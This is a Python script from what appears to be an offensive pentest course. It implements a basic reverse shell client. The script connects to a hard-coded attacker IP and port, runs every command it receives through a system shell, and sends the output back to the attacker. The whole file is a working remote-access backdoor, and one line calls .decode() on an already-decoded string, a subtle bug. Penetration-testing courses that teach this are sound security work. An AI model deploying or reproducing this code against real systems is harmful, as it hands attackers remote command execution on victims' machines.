# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn https://jo.linkedin.com/in/python2


# Basic TCP Client

import socket # For Building TCP Connection
import subprocess # To start the shell in the system

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'
    host=socket.gethostname()
    ip_adrr='172.16.110.224'
    port=8080
    s.connect((ip_adrr, port)) # Here we define the Attacker IP and the listening port
   
    while True: # keep receiving commands from the Kali machine
        commandreciev = s.recv(1024) # read the first KB of the tcp socket
        command=''
        if len(commandreciev)>0:
            print('command:',commandreciev.decode('utf-8'))
            command=commandreciev.decode('utf-8')
        if 'bye' in command: # if we got terminate order from the attacker, close the socket and break the loop
            s.close()
            break 

        else: # otherwise, we pass the received command to a shell process

            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(bytearray( CMD.stdout.read()) ) # send back the result
            s.send(bytearray( CMD.stderr.read() )) # send back the error -if any-, such as syntax error """

def main ():
    connect()
main()